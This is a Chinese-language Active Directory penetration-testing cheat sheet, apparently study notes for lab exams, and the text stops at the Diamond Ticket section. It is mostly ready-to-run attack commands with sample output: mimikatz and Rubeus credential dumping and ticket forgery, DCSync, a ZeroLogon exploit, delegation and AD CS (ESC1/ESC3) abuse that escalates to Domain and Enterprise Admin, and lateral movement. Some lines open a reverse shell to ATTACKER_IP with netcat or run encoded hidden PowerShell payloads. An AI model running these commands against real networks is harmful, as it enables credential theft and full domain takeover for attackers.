>偽造 **TGS（服務票證）**，只需要該服務帳號的密碼 hash 或 AES key（如 CIFS/HTTP 的 service account）

>[!WARNING]
>要製作Silver Ticket需要以下三個條件
>- SPN password hash
>- Domain SID
>- Target SPN
- 利用SPN列舉當前目標機器上有哪些可以發 Kerberos 票的服務 (SPN)
``` powershell
setspn -Q */*
```
``` powershell
setspn -Q */dcorp-dc*
```
``` powershell
Import-Module .\PowerView.ps1
Get-DomainComputer -Identity dcorp-dc | Get-DomainSPNTicket
Get-DomainComputer -Identity dcorp-dc | Select -ExpandProperty servicePrincipalName
```

為甚麼Silver Tickets可以登入呢? 因為登入Windows的方式有很多種，像是WinRM/WSMan 底層都是走http的，所以取得`http/dcorp-dc.dollarcorp.moneycorp.local`也是可以登入的，另外在 AD 裡，電腦預設就註冊一些通用的 SPN，像：
```
HOST/dcorp-dc
HTTP/dcorp-dc
LDAP/dcorp-dc
CIFS/dcorp-dc
```
這些 SPN 都是由「該機器的帳號」(Machine account) 提供的服務，所以要用這些帳號必須要使用Machine Account，畢竟Silver Tickets是用服務本身的帳號的hash簽的
常見的可利用組合有 :
- **HTTP Service** : HTTP + Machine Account
- **WMI Service**: (HOST + Machine Account) + (RPCSS + Machine Account)
- 可參考本篇打法[Write-Up](https://medium.com/@0xrave/nagoya-proving-grounds-practice-walkthrough-active-directory-bef41999b46f)

>需先利用mimikatz找出spn帳號的相關資訊，才可以製作
###  mimikatz
```
mimikatz privilege::debug
```
```
mimikatz sekurlsa::logonpasswords
```
```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 1147751 (00000000:00118367)
Session           : Service from 0
User Name         : iis_service
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/14/2022 4:52:14 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1109
        msv :
         [00000003] Primary
         * Username : iis_service
         * Domain   : CORP
         * NTLM     : 4d28cf5252d39971419580a51484ca09
         * SHA1     : ad321732afe417ebbd24d5c098f986c07872f312
         * DPAPI    : 1210259a27882fac52cf7c679ecf4443
...
```
- 取得SID
```
whoami /user
```
```
PS C:\Users\jeff> whoami /user

USER INFORMATION
----------------

User Name SID
========= =============================================
corp\jeff S-1-5-21-1987370270-658905905-1781884369-1105
```
- 產出銀票眷
```
mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
```
- 檢查
```
PS C:\Tools> klist 
```
- 存取測試
```
iwr -UseDefaultCredentials http://web04
```
### Rubeus
``` cmd
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:rpcss/dcorp-dc.dollarcorp.moneycorp.local /rc4:1be12164a06b817e834eb437dc8f581c /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```
- rc4 : machine account hash 
## Domain Controller Synchronization
>[!NOTE]
>DCSync 是一種濫用 Active Directory 複寫機制的攻擊：攻擊者在取得足夠的權限（或被賦予複寫權限）後，向域控制器模擬「域複寫」請求，藉此讓 DC 回傳帳號資料（包含 NTLM hash、Kerberos 密鑰等敏感認證資訊），用來竊取域憑證或建立長期存取。

>[!WARNING]
>當有權限做domain(HTB.local)做DACL (Discretionary Access Control List)的時候(以bloodhound就是WriteDACL)，就可以使用這招。

- 檢查有無Replication (DCSync) rights
``` powershell=
. C:\AD\Tools\PowerView.ps1
```
``` powershell
Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentx"}
```
- 如果有 Domain Admin權限，可以將使用者加入
``` 
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
- SafetyKatz : 單純拉出hash
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```
- mimikatz 
```
lsadump::dcsync /user:corp\dave
```
```
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
```
- PowerView 
``` powershell
$SecPassword = ConvertTo-SecureString 'password123' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb\tonee', $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity tonee -Rights DCSync
```
``` powershell
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "EGOTISTICAL-BANK,DC=local" -PrincipalIdentity svc_loanmgr -Rights DCSync
```
```
impacket-secretsdump htb.local/tonee:password123@10.129.95.210
```

## ZeroLogon
- [檢測用程式](https://github.com/SecuraBV/CVE-2020-1472)
```
./zerologon_tester.py HYDRA-DC 192.168.126.129
```
- [攻擊用程](https://github.com/dirkjanm/CVE-2020-1472)  
```
python cve-2020-1472-exploit.py HYDRA-DC 192.168.126.129 
```
- 打進去就不用密碼了
```
python secretsdump.py -just-dc MARVEL/HYDRA-DC\$@192.168.126.129
```
##  Kerberos Resourced Based Constrained Delegation 
>[!NOTE]
>在 Active Directory 中明確設定「某個服務帳號只能代表用戶，去存取**特定的服務/主機**」。管理員在 AD 使用者/電腦屬性裡，把某台伺服器（或服務帳號）的「委派」權限限制到指定的 SPN（Service Principal Name）。
>當使用者登入這台伺服器時，KDC 不會把完整的 TGT 下發給伺服器，而是允許伺服器使用 **Service for User to Proxy (S4U2Proxy)** 與 **Service for User to Self (S4U2Self)** 機制，去請 KDC 發票給指定的服務。

>[!TIP]
>使用者登入了一個前端服務 (Service A)，希望它能代替自己去存取另一個後端服務 (Service B)。
>- 用瀏覽器登入一台 Web 伺服器 (IIS)。
>- Web 伺服器要去 SQL Server 抓資料。
>- IIS 希望用**你的身份**去存取 SQL，而不是用它自己的帳號。
>- 只允許前端服務（例如 IIS 的服務帳號）代表使用者去存取「指定的服務 (Service Principal Names, SPN)」。
### Constrained Delegation技術原理
- 管理員在 AD 中設定一個帳號（通常是 Web/IIS 的 service account）：「此帳號可以代替使用者存取 `MSSQLSvc/sql01.contoso.local`。」
- AD 會在該服務帳號物件上寫入 **`msDS-AllowedToDelegateTo` 屬性**，裡面列出允許委派的 SPN。
- 使用流程：
    1. 使用者 → IIS：正常 Kerberos 登入，拿到 TGS。
    2. IIS 用使用者的 TGS 去向 KDC 請一張**S4U2Proxy 票**，但只能給 `msDS-AllowedToDelegateTo` 裡允許的服務。
    3. KDC 核對設定後簽發 TGS。
    4. IIS 拿這張 TGS 去 SQL Server 存取資料。
> 核心重點：前端服務只拿得到「去特定後端服務」的票，不能亂用。
### Constrained Delegation列舉
``` powershell
Get-DomainUser -TrustedToAuth
```
```
[snip]
logoncount : 2
badpasswordtime : 12/31/1600 4:00:00 PM
distinguishedname : CN=web
svc,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
objectclass : {top, person, organizationalPerson, user}
displayname : web svc
lastlogontimestamp : 11/14/2022 4:45:59 AM
userprincipalname : websvc    
whencreated : 11/14/2022 12:42:13 PM
samaccountname : websvc
codepage : 0
samaccounttype : USER_OBJECT
accountexpires : NEVER
countrycode : 0
whenchanged : 11/14/2022 12:45:59 PM
instancetype : 4
usncreated : 38071
objectguid : b7ab147c-f929-4ad2-82c9-7e1b656492fe
sn : svc
lastlogoff : 12/31/1600 4:00:00 PM
msds-allowedtodelegateto : {CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL,CIFS/dcorp-mssql}
objectcategory :
CN=Person,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
dscorepropagationdata : {11/14/2022 12:42:13 PM, 1/1/1601 12:00:00 AM}
serviceprincipalname : {SNMP/ufc-adminsrv.dollarcorp.moneycorp.LOCAL,
SNMP/ufc-adminsrv}
givenname : web
usnchanged : 38144
lastlogon : 11/16/2022 4:05:33 AM
badpwdcount : 0
cn : web svc
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD,
TRUSTED_TO_AUTH_FOR_DELEGATION   
objectsid : S-1-5-21-719815819-3726368948-3917688648-1114
primarygroupid : 513
pwdlastset : 11/14/2022 4:42:13 AM
name : web svc
[snip]
```
列舉的輸出，應該特別注意以下
```
userprincipalname : websvc
msds-allowedtodelegateto : {CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL,CIFS/dcorp-mssql}
TRUSTED_TO_AUTH_FOR_DELEGATION
```
### Constrained Delegation利用
>[!WARNING]
>攻擊條件 : 攻擊者已經拿到一個有 Constrained Delegation 權限的帳號
1. **取得該服務帳號的 key**
       - 透過 Kerberoasting、配置不當、憑證 dump 等方式得到 `websvc` 的密碼雜湊/AES key。
2. **S4U2Self (假裝任何使用者)**
    - 攻擊者用 `websvc` 的金鑰請求一張「我代表 Administrator 的 TGS」(S4U2Self)。
    - 這張票雖然是 `Administrator` 身分，但只能給 `websvc` 自己用。
3. **S4U2Proxy (轉換成目標服務票)**
    - 接著 `websvc` 用這張假扮 Administrator 的 TGS，去 KDC 要「我要拿 Administrator 身份去訪問 SQL (`MSSQLSvc/sql01`) 的票」。
    - KDC 看到 `websvc` 的 `msDS-AllowedToDelegateTo` 列出了 `MSSQLSvc/sql01`，就簽給它。
4. **使用票證**
    - 攻擊者得到一張「Administrator → SQL」的合法 Kerberos 票（TGS），然後可以直接 Pass-the-Ticket 存取 SQL。

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL" /ptt
```
```
klist
```
```
dir \\dcorp-mssql.dollarcorp.moneycorp.local\c$
```


### 以下是考OSCP時期不知道從哪個Write-UP抄來的
>[!WARNING]
>當在BloodHound發現帳號對DC有Generic All權限時，他可能可以這樣打 
- 利用impacket-addcomputer 建立一個machine帳戶
```
impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.241.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'
```
- 利用rbcd.py不知道衝三小 
[GitHub連結](https://github.com/tothi/rbcd-attack?source=post_page-----50c25c5a23c5--------------------------------)
```
 /opt/rbcd-attack/rbcd.py -dc-ip 192.168.241.175 -t RESOURCEDC -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone  
```
- 利用impacket-getST獲取ticket
```
impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip 192.168.241.175
```
- 為impacket-psexec設定變數
```
export KRB5CCNAME=./Administrator.ccache
```
- 修改`/etc/hosts`
```
sudo sh -c 'echo "192.168.160.175 resourcedc.resourced.local" >> /etc/hosts'
```
- 用Impacket-psexec打進去
```
sudo impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.241.175
```
## Unconstrained Delegation
>[!NOTE]
>只要某台電腦或服務帳號在 AD 中被設成「Trusted for delegation」，當使用者登入該主機時，KDC 會把使用者的 **TGT（Ticket Granting Ticket）** 一併交給它，這台主機可以用這個 TGT 去申請任意服務的 TGS（Service Ticket)。
```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
```
### Unconstrained Delegation列舉
``` powershell
. C:\AD\Tools\PowerView.ps1
```
``` powershell
Get-DomainComputer -Unconstrained | select -ExpandProperty **name**
```
### Unconstrained Delegation利用
>[!warning]
>利用的前提是，要先有對目標主機(`et-DomainComputer -Unconstrained`出來的結果)的Local Admin

>[!WARNING]
>要在具有Unconstrained Delegation的主機跑 listener，再用工具(MS-RPRN.exe、WSPCoerce.exe、DFSCoerce-andrea.exe)觸發
- listener
```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
```
- Tools
``` powershell
C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```
``` powershell
C:\AD\Tools\Loader.exe -path C:\AD\tools\WSPCoerce.exe -args DCORP-DC DCORP-APPSRV
```
``` powershell
C:\AD\Tools\DFSCoerce-andrea.exe -t dcorp-dc -l dcorp-appsrv
```

用以上任意一個工具去強迫`dcorp-dc$`對dcorp-appsrv做Unconstrained Delegation發生，接著listener mode的Rubeus就會收到 `dcorp-dc$`的TGT
- Exploit
``` 
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args ptt /ticket:doIFx...
```
跳出視窗後，可以dump lsa
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```
## Resource-Based Constrained Delegation (RBCD)
>[!NOTE]
>**RBCD 是 KCD 的新型態**，差別在於它把控制權「下放給資源端」，不需要 Domain Admin，**目標資源（被訪問的電腦）本身就能決定**「誰可以代替使用者進來」。在「資源方」的帳號物件上設定 `msDS-AllowedToActOnBehalfOfOtherIdentity`， 意思是資源（被存取的服務）自己決定「誰可以代表使用者來訪問我」。這樣可以避免原本要 Domain Admin 權限才能修改委派屬性，降低管理負擔，但同時也帶來濫用風險。

>[!CAUTION]
>如果你對某台機器的 AD 物件有 **GenericWrite / WriteDACL** 權限（即使你不是 Domain Admin），你就能改它的 `msDS-AllowedToActOnBehalfOfOtherIdentity`，指定「你的機器」為被信任代理人，設定完後，你就能用自己的機器帳號，去假冒任何域內使用者（甚至 Domain Admin）存取那台目標機器。
### PowerView 指令
``` powershell=
Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-studentx$' -Verbose
```

- 上方指令為用來設定某個目標（這裡是 `dcorp-mgmt`，一台電腦物件）的 RBCD 權限。
	- `-DelegateFrom 'dcorp-studentx$'` 表示：允許 `dcorp-studentx$` 這個電腦帳號，能代表任何使用者去訪問 `dcorp-mgmt`。
	- 換句話說：在 `dcorp-mgmt` 的 AD 屬性 `msDS-AllowedToActOnBehalfOfOtherIdentity` 裡，新增了 `dcorp-studentx$`。
	- 結果：如果攻擊者控制了 `dcorp-studentx$` 這台機器，就能冒用域內任意使用者（甚至 Domain Admin）去連線 `dcorp-mgmt`，拿到高權限。
- 顯示哪些電腦物件設定了 RBCD
``` powershell
Get-DomainRBCD
```
## AD CS攻擊手法
>[!NOTE]
>主要分成ECS1-8
### AD CS 列舉
- 在目前網域中尋找所有「可發行憑證的企業 CA」
```
C:\AD\Tools\Certify.exe cas
```
- 列出所有templates
```
C:\AD\Tools\Certify.exe find
```
### ESC1 攻擊手法
>[!NOTE]
>**ESC1** 就是「範本允許任何申請人自己指定憑證主體 (ENROLLEE_SUPPLIES_SUBJECT)，而憑證又能做 Client Authentication」，導致一般使用者可以簽出看似 Administrator 的憑證，進而取得高權限 Kerberos TGT。

>[!INFO]
>憑證範本允許申請者（enrollee）自己決定憑證裡的「Subject」欄位（甚至 Subject Alternative Name, SAN），而這張憑證又可以用於 **Client Authentication**。

```
C:\AD\Tools\Certify.exe find /enrolleeSuppliesSubject
```
```
CA Name : mcorp-dc.moneycorp.local\moneycorpMCORP-DC-CA
 Template Name : HTTPSCertificates
 Schema Version : 2
 Validity Period : 1 year
 Renewal Period : 6 weeks
msPKI-Certificates-Name-Flag : ENROLLEE_SUPPLIES_SUBJECT
 mspki-enrollment-flag : INCLUDE_SYMMETRIC_ALGORITHMS,
PUBLISH_TO_DS
Authorized Signatures Required : 0	
pkiextendedkeyusage : Client Authentication, Encrypting
File System, Secure Email
 mspki-certificate-application-policy : Client Authentication, Encrypting
File System, Secure Email
 Permissions
 Enrollment Permissions
Enrollment Rights : dcorp\RDPUsers S-1-5-21-719815819-3726368948-3917688648-1123
 mcorp\Domain Admins S-1-5-21-
335606122-960912869-3279953914-512
 mcorp\Enterprise Admins S-1-5-21-
335606122-960912869-3279953914-519
```
注意這個flag : 
```
msPKI-Certificates-Name-Flag : ENROLLEE_SUPPLIES_SUBJECT
```

```
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator
```
如果成功，就會輸出PRIVATE KEY + CERTIFICATE 的 **X.509** 公開金鑰憑證(**HTTPSCertificates 範本的憑證和對應的私鑰**)，必須把他儲存起來到esc1.pem
```
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-DA.pfx
```
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:esc1-DA.pfx /password:SecretPass@123 /ptt
```
```
winrs -r:dcorp-dc cmd /c set username
```
### ESC3 攻擊手法
>[!NOTE]
>證代理人 (Certificate Request Agent) 被濫用。攻擊者先申請一張「Enrollment Agent」憑證，再用它幫自己或任何高權限帳號申請用於登入/身份驗證的憑證，進而獲得目標帳號（如 Administrator）的 Kerberos TGT 或 AD 登入。

>[!TIP]
>先申請一張「可以幫別人辦憑證」的代理人憑證 → 再用它幫 Domain Admin 申請憑證 → 再用那張 Admin 憑證去要 Admin 的 Kerberos TGT。

```
C:\AD\Tools\Certify.exe find /vulnerable
```
```
[!] Vulnerable Certificates Templates :
 CA Name : mcorpdc.moneycorp.local\moneycorp-MCORP-DC-CA
 Template Name : SmartCardEnrollment-Agent
 Schema Version : 2
 Validity Period : 10 years
 Renewal Period : 6 weeks
 msPKI-Certificates-Name-Flag : SUBJECT_ALT_REQUIRE_UPN,
SUBJECT_REQUIRE_DIRECTORY_PATH
 mspki-enrollment-flag : AUTO_ENROLLMENT
 Authorized Signatures Required : 0
 pkiextendedkeyusage : Certificate Request Agent
 mspki-certificate-application-policy : Certificate Request Agent
 Permissions
 Enrollment Permissions
 Enrollment Rights : dcorp\Domain Users S-1-5-21-335606122-960912869-3279953914-513
 mcorp\Domain Admins S-1-5-21-
335606122-960912869-3279953914-512
 mcorp\Enterprise Admins S-1-5-21-
335606122-960912869-3279953914-519
```
注意到`pkiextendedkeyusage : Certificate Request Agent`，代表這個範本做出來的憑證都會有**可以幫別人辦憑證的能力**，

```
C:\AD\Tools\Certify.exe find
```
```
 Template Name : SmartCardEnrollment-Users
 Schema Version : 2
 Validity Period : 10 years
 Renewal Period : 6 weeks
 msPKI-Certificates-Name-Flag : SUBJECT_ALT_REQUIRE_UPN,
SUBJECT_REQUIRE_DIRECTORY_PATH
 mspki-enrollment-flag : AUTO_ENROLLMENT
 Authorized Signatures Required : 1
Application Policies : Certificate Request Agent
 pkiextendedkeyusage : Client Authentication, Encrypting
File System, Secure Email
 mspki-certificate-application-policy : Client Authentication, Encrypting
File System, Secure Email
 Permissions
 Enrollment Permissions
Enrollment Rights : dcorp\Domain Users S-1-5-21-719815819-3726368948-3917688648-513
 mcorp\Domain Admins S-1-5-21-
719815819-3726368948-3917688648-512
 mcorp\Enterprise Admins S-1-5-21-
719815819-3726368948-3917688648-519
```
注意到`Application Policies : Certificate Request Agent`，代表這個憑證確實具**備代辦憑證的能力**
因此利用的方式會先申請SmartCardEnrollment-Agent，攻擊者（一般網域帳號）去 CA 申請一張 **Enrollment Agent** 憑證（因為這個範本 Domain Users 就能用）。  
>這張憑證的特權：可以代替別人去要憑證。
```
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent
```
```
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-agent.pfx
```
有了這個 Enrollment Agent，就可以跟 SmartCardEnrollment-Users 請求「我要幫 Administrator 申請一張 SmartCardEnrollment-Users 用戶憑證」。  CA 因為信任代理人憑證，所以直接給你一張 **Administrator 身份的用戶憑證**。
 ```
 C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator /enrollcert:C:\AD\Tools\esc3-agent.pfx /enrollcertpw:SecretPass@123
 ```
```
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3-DA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-DA.pfx
```
用剛偽造出來的「Administrator 憑證」做 PKINIT，去 KDC 拿到 Administrator 的 TGT，並直接注入記憶體。  現在就變成Domain Admin的身份了
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:esc3-DA.pfx /password:SecretPass@123 /ptt
```
```
winrs -r:dcorp-dc cmd /c set username
```
如果要拿到Enterprise Admin，可以使用` '/onbehalfof: mcorp\administrator'` 
```
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:mcorp\administrator /enrollcert:C:\AD\Tools\esc3-agent.pfx /enrollcertpw:SecretPass@123
```
 ```
 winrs -r:mcorp-dc cmd /c  set username
 ```
# 橫移及Persistence手法
>[!NOTE]
>橫向擴散、長期維運與潛伏的手法
## WMI and WinRM
>[!WARNING]
>Windows Management Instrumentation (WMI)可以利用RPC在遠端電腦創建process
- wmic (deprecated)
```
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
```
>當然要有目標那台的administrators的全組裡面的帳號阿
```
C:\Users\jeff\Desktop>wmic /node:192.168.216.73 /user:jen /password:Nexus123! process call create "calc"
Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ProcessId = 5552;
        ReturnValue = 0;
};
```

> 利用powershell執行，需要有遠端的帳號密碼才可以。  

> WinRM只有 Administrators 或是 Remote Management Users group裡面的人才可以使用，也是可以遠端執行程序，WinRM使用5985(encrypt https)及5986(plaintext http)

- WMI
``` powershell
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;


$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options 
$command = 'powershell -nop -w hidden -e ..........';

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```
- WinRM
``` powershell
winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
winrs.exe -r:files04 -u:jen -p:Nexus123! "powershell -nop -w hidden -e JABjAGw....."
```
```
winrs -r:dcorp-adminsrv cmd
```
- WinRM for Powershell
``` powershell
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName 192.168.217.73 -Credential $credential
```
``` powershell
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
```
``` powershell
Enter-PSSession 1
```
## PsExec
```
./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
```
## Pass The Hash
>[!WARNING]
>很多種方法，這邊教impacket-wmiexec
```
/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
```
## Overpass the Hash
>[!NOTE]
>用 NTLM hash 當成 Kerberos 使用者 key，直接生成 AS-REQ 拿 TGT，讓只有 hash 的攻擊者也能進 Kerberos 世界。

>[!WARNING]
>概念就是當本機有殘存他人的帳號跟hash，該帳號又可以登入目標機器，那就可以嘗試用殘存的帳號hash製作TGT來利用
>1. 用mimikatz取得NTLM
>2. 用mimikatz製作假票券

>[!WARNING]
>因為user在request TGT的過程中，會需要用key加密timestamp(RC4, AES128 or AES256)，所以在製作時需要注意

```
privilege::debug
sekurlsa::logonpasswords
```
```
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
```
``` 
sekurlsa::ekeys
```
```
Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```
- 直接跳出一個cmd的方式
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
### TryHackMe提供的方法
- 列舉資訊`sekurlsa::ekeys`可以撈出所有key
```shell
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```
- **If we have the RC4 hash:**
```shell
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```
- **If we have the AES128 hash:**
```shell
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```
- **If we have the AES256 hash:**
```shell
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```
>在tryhackme的範例中，最後一行指令打出來就會拿到reverse shell了
### 擴散方法
>[!NOTE]
> jen是目標用戶，也就是可以登入的用戶 ，嘗試存取\\files04之後，就代表已經拿到krbtgt了，既然拿到TGT，就代表可以存取該主機。
* 確認可以存取files04
``` cmd
net use \\files04 
klist 
```
* 利用PsExec進入主機files04
``` cmd
.\PsExec.exe \\files04 cmd
```
## Pass the Ticket
>[!WARNING]
>想定為如果本機殘存TGT/TGS，那就可以把他們拉戳來做類似pass the hash的事情

> mimikatz.exe可以把memory中所有的TGT\TGS匯出，然後匯入klist，就可以用了。
### mimikatz.exe產出TGT\TGS
- 匯出TGT\TGS (匯出會放在同意個資料夾內)
```
sekurlsa::tickets /export
```
- 匯入klist
```
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```
### Rubeus 的相關指令
- 匯出TGT\TGS 
```
Rubeus.exe dump /nowrap
```
- 匯入klist
```
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```
- 製作並匯入klist
```
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```
>在成功匯入TGT之後，直接輸入`powershell`可以做到PowerShell Remoting
## DCOM
- 建立dcom物件
``` powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
```
- 建立於遠端的process
``` powershell
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
```
- 建立於遠端的process(reverse)
``` powershell
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD==","7")
```
## Golden Ticket
>[!NOTE]
>完全偽造 TGT，只要拿到 **krbtgt 帳號的 NTLM hash 或 Kerberos key**，就能憑空生成任意使用者的 TGT。

>[!WARNING]
>當使用者送出一個TGT的request，KDC會使用krbtgt的password hash來幫TGT加密，所以如果知道krbtgt的password hash，那就可以自己製作golden tickets。

>[!WARNING]
>- 拿下一個domain admin帳戶
>- compromised the domain controller itself

- 用mimikatz撈出記憶體內資料
```
lsadump::lsa /patch
```
- 刪除既有的Kerberos tickets
```
kerberos::purge
```
### 製作金票眷
- mimikatz
```
kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
```
- Rubeus - evasive-golden mode
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /user:Administrator /id:500 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /netbios:dcorp /ptt
```
- Rubeus - evasive-silver mode
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:132f54e05f7c3db02e97c00ff3879067 /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap
```
## Diamond Ticket
>[!NOTE]
>- 先合法向 KDC 取得一張 TGT（確保格式正確、欄位完整）。
>- 修改關鍵欄位（例如把自己塞進 Domain Admins）。
>- 用 krbtgt 的 key 重新簽章，使得票證驗證仍然通過。

>[!WARNING]
>需要有krbtgt的aes256_hmac

```
